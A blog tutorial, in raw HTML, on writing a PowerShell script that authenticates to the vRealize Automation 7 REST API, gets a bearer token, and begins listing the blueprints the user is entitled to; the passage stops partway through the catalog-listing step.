&lt;p&gt;At my workplace, we use vSphere and vRealize to provide virtual machines to students for labs, assignments, and exams. Since we are using VMs in this many areas, it means that is a high overhead of managing numerous VMs. Think of having a class of 50 students, with approximately 3-6 VMs per course… resulting in large numbers of VMs to manage! I have PowerCLI scripts to perform many tasks on vSphere, yet had no solution to managing vRealize deployments or blueprints directly. That was until I read &lt;a href=&quot;http://www.vmtocloud.com/how-to-script-a-vrealize-automation-7-rest-api-request/&quot;&gt;How to script a vRealize Automation 7 REST API request&lt;/a&gt;, by Ryan Kelly. His vRealize Automation scripts were written in BASH… However, I wanted to use PowerShell. This is primarily due to my heavy use of the PowerCLI tool to manage vSphere, which is only available on Windows PowerShell.&lt;/p&gt;
&lt;p&gt;This post goes into detail about how to write a PowerShell script to automate connection to the vRealize Automation REST API. This post finishes with the most simple task, to list the names of any vRealize deployments that the user has access to. The post has the following prerequisites:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;An account with access to a vRealize server&lt;/li&gt;
&lt;li&gt;Windows PowerShell&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In addition, I have started to add PowerShell scripts and modules to my &lt;a href=&quot;https://github.com/thomaslaurenson/vSphereScripts&quot;&gt;vSphereScripts
&lt;/a&gt; repository on GitHub. Like the currently available vSphere scripts, these are targeted to automate management of virtual machines.&lt;/p&gt;
&lt;h2 id=&quot;vrealize-automation-7-rest-api-request-using-powershell&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#vrealize-automation-7-rest-api-request-using-powershell&quot; aria-label=&quot;vrealize automation 7 rest api request using powershell permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;vRealize Automation 7 REST API Request Using PowerShell&lt;/h2&gt;
&lt;p&gt;The first thing to do is open &lt;em&gt;Windows PowerShell ISE&lt;/em&gt; or &lt;em&gt;Visual Studio Code&lt;/em&gt; and create a new file/script. Feel free to name it whatever you want, however, it is sensible to use the &lt;code class=&quot;language-text&quot;&gt;.ps1&lt;/code&gt; file extension to identify it as a PowerShell script.&lt;/p&gt;
&lt;h3 id=&quot;connecting-to-a-vrealize-server&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#connecting-to-a-vrealize-server&quot; aria-label=&quot;connecting to a vrealize server permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Connecting to a vRealize server&lt;/h3&gt;
&lt;p&gt;The first piece of information needed is the hostname of the vRealize server. For the sake of this tutorial, we will specify the following hostname: &lt;code class=&quot;language-text&quot;&gt;https://vra01.corp.local/&lt;/code&gt;. Add a line that specifies a variable named &lt;code class=&quot;language-text&quot;&gt;$vra_server&lt;/code&gt; that has the string of the server, for example:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$vra_server&lt;/span&gt; = &lt;span class=&quot;token string&quot;&gt;&quot;https://vra01.corp.local/&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This value will be used multiple times, for each API request. So it makes sense to store the information in a variable.&lt;/p&gt;
&lt;p&gt;In order to authenticate with the vRealize server, we must have valid credentials. We could use a simple approach to get the user credentials; either 1) Hard-code them into the script, or 2) Use the &lt;code class=&quot;language-text&quot;&gt;Read-Host -Prompt&lt;/code&gt; module. However, both of these are insecure. Instead, I recommend using the &lt;code class=&quot;language-text&quot;&gt;Get-Credential&lt;/code&gt; module, designed specifically for handling user credentials. The following code will ask the user for a username and password and store it in a &lt;code class=&quot;language-text&quot;&gt;PSCredential&lt;/code&gt; object. We can then extract the username and password from this object. Add the following line to your script.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$credentials&lt;/span&gt;=&lt;span class=&quot;token function&quot;&gt;Get-Credential&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Message &lt;span class=&quot;token string&quot;&gt;&quot;Please enter your vRealize credentials&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code class=&quot;language-text&quot;&gt;Get-Credential&lt;/code&gt; module can be a little finicky to deal with. We will need to extract data from the &lt;code class=&quot;language-text&quot;&gt;PSCredential&lt;/code&gt; object later in the script. Next, we must specify the tenant address for vRealize. We will, again, store this in a variable for later use.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$tenant&lt;/span&gt; = &lt;span class=&quot;token string&quot;&gt;&quot;vsphere.local&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The tenant name should be &lt;code class=&quot;language-text&quot;&gt;vsphere.local&lt;/code&gt;, as &lt;a href=&quot;https://docs.vmware.com/en/vRealize-Automation/6.2/com.vmware.vra.62.upgrade.doc/GUID-FE589514-85C9-401C-9DF1-2983F0D3AAD1.html&quot;&gt;vRealize Automation requiquires vsphere.local as the default tenant name&lt;/a&gt;. Ok, so far we have three key pieces of information: 1) Username, 2) Password and 3) Tenant. We must send this information, using a POST, to the REST API. We must also send this information in JSON format. So we should convert and combine the information into a single JSON object. The following code will perform this task, and store the information in a JSON object variable called &lt;code class=&quot;language-text&quot;&gt;$data&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt; = @&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    username=&lt;span class=&quot;token variable&quot;&gt;$credentials&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;username
    password=&lt;span class=&quot;token variable&quot;&gt;$credentials&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;GetNetworkCredential&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;password
    tenant=&lt;span class=&quot;token variable&quot;&gt;$tenant&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt; = &lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;ConvertTo-Json&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It is important to quickly summarise what just happened. The &lt;code class=&quot;language-text&quot;&gt;username=$credentials.username&lt;/code&gt; line populates the username from &lt;code class=&quot;language-text&quot;&gt;$credentials&lt;/code&gt; (the &lt;code class=&quot;language-text&quot;&gt;PSCredential&lt;/code&gt; object) into the hash table. The password population is a little trickier. The password must be sent in plaintext, not a SecureString - as stored in the &lt;code class=&quot;language-text&quot;&gt;PSCrential&lt;/code&gt; object. The &lt;em&gt;Hey, Scripting Guy! Blog&lt;/em&gt; provided excellent advice on how to &lt;a href=&quot;https://blogs.technet.microsoft.com/heyscriptingguy/2013/03/26/decrypt-powershell-secure-string-password/&quot;&gt;decrypt PowerShell secure string passwords&lt;/a&gt; by using &lt;code class=&quot;language-text&quot;&gt;GetNetworkCredential().password&lt;/code&gt;. Finally, copying over the tenant information is a simple reference to the &lt;code class=&quot;language-text&quot;&gt;$tenant&lt;/code&gt; variable.&lt;/p&gt;
&lt;p&gt;Next, we need to craft the URL to perform the POST to. The suffix of the URL is &lt;code class=&quot;language-text&quot;&gt;identity/api/tokens&lt;/code&gt;, which can simply be added to the &lt;code class=&quot;language-text&quot;&gt;$vra_server&lt;/code&gt; variable to get the full URL. For example, the end result will be the following URL:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;https://vra01.corp.local/identity/api/tokens&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This is easily achieved using string concatenation:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$uri&lt;/span&gt; = &lt;span class=&quot;token variable&quot;&gt;$vra_server&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;identity/api/tokens&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now need to specify the correct headers for the API request. We need to specify what type of data we are sending, and what type of data we want to receive back. In both cases, we want to specify JSON. From my experience, the easiest and most flexible method is to use a dictionary to store multiple header variables. This is demonstrated in the following code.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$header&lt;/span&gt; = &lt;span class=&quot;token function&quot;&gt;New-Object&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;System.Collections.Generic.Dictionary[[String],[String]]&quot;&lt;/span&gt;
&lt;span class=&quot;token variable&quot;&gt;$header&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Add&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;application/json&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token variable&quot;&gt;$header&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Add&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;application/json&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;To summarize, on the first line we create a new dictionary with the variable name &lt;code class=&quot;language-text&quot;&gt;$header&lt;/code&gt; that has a key type of string and a value type of string. The second line specifies an &lt;code class=&quot;language-text&quot;&gt;Accept&lt;/code&gt; value of &lt;code class=&quot;language-text&quot;&gt;application/json&lt;/code&gt; so that we get JSON data back. The third line specifies a &lt;code class=&quot;language-text&quot;&gt;Content-Type&lt;/code&gt; of &lt;code class=&quot;language-text&quot;&gt;application/json&lt;/code&gt; so the server knows we are sending them JSON formatted data. &lt;/p&gt;
&lt;p&gt;Everything is now configured to actually perform authentication against the server and get a &lt;strong&gt;bearer token to be used in every future API request&lt;/strong&gt;. This token is exceptionally important, and we can use it multiple times until the token is expired. It is sent with an expiry time, so you can determine how long it is valid for. &lt;/p&gt;
&lt;p&gt;To perform authentication and get the bearer token, we can leverage the &lt;code class=&quot;language-text&quot;&gt;Invoke-RestMethod&lt;/code&gt; module, and perform a &lt;code class=&quot;language-text&quot;&gt;-Method Post&lt;/code&gt;. Basically, we want to post the &lt;code class=&quot;language-text&quot;&gt;$data&lt;/code&gt; JSON object to the &lt;code class=&quot;language-text&quot;&gt;$uri&lt;/code&gt;. In other words, we post the credentials and tenant to the URL of the REST API. We must also specify that the POST should use the &lt;code class=&quot;language-text&quot;&gt;$header&lt;/code&gt; value we previously specified. Basically, that we are sending JSON, and want JSON back in return. It is useful to grab the &lt;em&gt;response&lt;/em&gt;, a JSON object, and store it in a variable. The variable name we will use is &lt;code class=&quot;language-text&quot;&gt;$response&lt;/code&gt;. The following line of code performs the POST:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$response&lt;/span&gt; = &lt;span class=&quot;token function&quot;&gt;Invoke-RestMethod&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Method Post &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Uri &lt;span class=&quot;token variable&quot;&gt;$uri&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Headers &lt;span class=&quot;token variable&quot;&gt;$header&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Body &lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This is a very simple one-line solution. However, I prefer to wrap the REST request in a &lt;code class=&quot;language-text&quot;&gt;try&lt;/code&gt; and &lt;code class=&quot;language-text&quot;&gt;catch&lt;/code&gt; to check the result, so we have an idea if things go wrong. The following code snippet tries to perform the POST, and if it fails will print some useful information including the status code error, which can be very useful for debugging.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token variable&quot;&gt;$response&lt;/span&gt; = &lt;span class=&quot;token function&quot;&gt;Invoke-RestMethod&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Method Post &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Uri &lt;span class=&quot;token variable&quot;&gt;$uri&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Headers &lt;span class=&quot;token variable&quot;&gt;$header&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Body &lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;Write-Host&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;StatusCode:&quot;&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Exception&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Response&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;StatusCode&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;value__
    &lt;span class=&quot;token function&quot;&gt;Write-Host&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;StatusDescription:&quot;&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Exception&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Response&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;StatusDescription
    &lt;span class=&quot;token keyword&quot;&gt;exit&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The final part, we need to extract the bearer token from the JSON we received back from the server. The &lt;code class=&quot;language-text&quot;&gt;$response&lt;/code&gt; variable will contain three values: 1) &lt;code class=&quot;language-text&quot;&gt;expires&lt;/code&gt; is a string value of when the token will expire, 2) &lt;code class=&quot;language-text&quot;&gt;tenant&lt;/code&gt; is another string value of the current tenant which should be &lt;code class=&quot;language-text&quot;&gt;vsphere.local&lt;/code&gt;, and 3) &lt;code class=&quot;language-text&quot;&gt;id&lt;/code&gt; which is a string value of the bearer token - &lt;strong&gt;this is the value we want!&lt;/strong&gt; You can easily extract the bearer token using the following code:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$bearer_token&lt;/span&gt; = &lt;span class=&quot;token variable&quot;&gt;$response&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;id&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;However, this approach has a major drawback… It is not in the correct format for subsequent REST requests. Any subsequent REST API requests will want the bearer token with a string &lt;code class=&quot;language-text&quot;&gt;Bearer&lt;/code&gt; before the actual token. For example: &lt;code class=&quot;language-text&quot;&gt;Bearer 89ry29h293930r8uru&lt;/code&gt;. We can leverage some string concatenation to achieve this:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$bearer_token&lt;/span&gt; = &lt;span class=&quot;token string&quot;&gt;&quot;Bearer &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$response&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;id&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nicely done if you got this far and that you could successfully get the bearer token. This is somewhat challenging, but means we are now authenticated with the vRealize server and can now perform some actually useful REST API requests using our bearer token! The full script is provided below for reference.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$vra_server&lt;/span&gt; = &lt;span class=&quot;token string&quot;&gt;&quot;https://vra01.corp.local/&quot;&lt;/span&gt;

&lt;span class=&quot;token variable&quot;&gt;$credentials&lt;/span&gt;=&lt;span class=&quot;token function&quot;&gt;Get-Credential&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Message &lt;span class=&quot;token string&quot;&gt;&quot;Please enter your vRealize credentials&quot;&lt;/span&gt;

&lt;span class=&quot;token variable&quot;&gt;$tenant&lt;/span&gt; = &lt;span class=&quot;token string&quot;&gt;&quot;vsphere.local&quot;&lt;/span&gt;

&lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt; = @&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    username=&lt;span class=&quot;token variable&quot;&gt;$credentials&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;username
    password=&lt;span class=&quot;token variable&quot;&gt;$credentials&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;GetNetworkCredential&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;password
    tenant=&lt;span class=&quot;token variable&quot;&gt;$tenant&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt; = &lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;ConvertTo-Json&lt;/span&gt;

&lt;span class=&quot;token variable&quot;&gt;$uri&lt;/span&gt; = &lt;span class=&quot;token variable&quot;&gt;$vra_server&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;identity/api/tokens&quot;&lt;/span&gt;

&lt;span class=&quot;token variable&quot;&gt;$header&lt;/span&gt; = &lt;span class=&quot;token function&quot;&gt;New-Object&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;System.Collections.Generic.Dictionary[[String],[String]]&quot;&lt;/span&gt;
&lt;span class=&quot;token variable&quot;&gt;$header&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Add&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;application/json&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token variable&quot;&gt;$header&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Add&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;application/json&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token variable&quot;&gt;$response&lt;/span&gt; = &lt;span class=&quot;token function&quot;&gt;Invoke-RestMethod&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Method Post &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Uri &lt;span class=&quot;token variable&quot;&gt;$uri&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Headers &lt;span class=&quot;token variable&quot;&gt;$header&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;Body &lt;span class=&quot;token variable&quot;&gt;$data&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;Write-Host&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;StatusCode:&quot;&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Exception&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Response&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;StatusCode&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;value__
    &lt;span class=&quot;token function&quot;&gt;Write-Host&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;StatusDescription:&quot;&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Exception&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Response&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;StatusDescription
    &lt;span class=&quot;token keyword&quot;&gt;exit&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token variable&quot;&gt;$bearer_token&lt;/span&gt; = &lt;span class=&quot;token string&quot;&gt;&quot;Bearer &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$response&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;id&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;listing-catalog-items-listing-available-blueprints&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#listing-catalog-items-listing-available-blueprints&quot; aria-label=&quot;listing catalog items listing available blueprints permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Listing Catalog Items (Listing Available Blueprints)&lt;/h3&gt;
&lt;p&gt;Now that we have authenticated with the vRealize server, we can perform some useful tasks. To start, we will simply list the Blueprints - these are vRealize Blueprints that are available to the authenticated user! This is a very simple example but will provide the basis on what can be achieved and guide future tasks that can be performed.&lt;/p&gt;
&lt;p&gt;The &lt;code class=&quot;language-text&quot;&gt;entitledCatalogItemViews&lt;/code&gt; is the resource needed that is provided in the &lt;em&gt;Catalog Consumer REST API&lt;/em&gt;. The &lt;code class=&quot;language-text&quot;&gt;entitledCatalogItemViews&lt;/code&gt; will provide a list of catalog items (blueprints) that are active, associated with a service, and that the user we have authenticated with had entitlements to &lt;em&gt;consume&lt;/em&gt;. Basically, catalog items that we are entitled to view, and use.&lt;/p&gt;
&lt;p&gt;The following example will continue adding to the script we started above. So you will notice that we will re-use some variables we have already defined. Start by updating the &lt;code class=&quot;language-text&quot;&gt;$uri&lt;/code&gt; to perform a request of &lt;code class=&quot;language-text&quot;&gt;entitledCatalogItemViews&lt;/code&gt;. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$uri&lt;/span&gt; = &lt;span class=&quot;token variable&quot;&gt;$vra_server&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;catalog-service/api/consumer/entitledCatalogItemViews&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Next, we will need to add the bearer token to the already defined &lt;code class=&quot;language-text&quot;&gt;$header&lt;/code&gt; variable. We must define this additional header, or else we will get an unauthenticated error. We can simply add another dictionary entry with the key value of &lt;code class=&quot;language-text&quot;&gt;Authentication&lt;/code&gt;, and the value set to the contents of the &lt;code class=&quot;language-text&quot;&gt;$bearer_token&lt;/code&gt; variable.&lt;/p&gt;
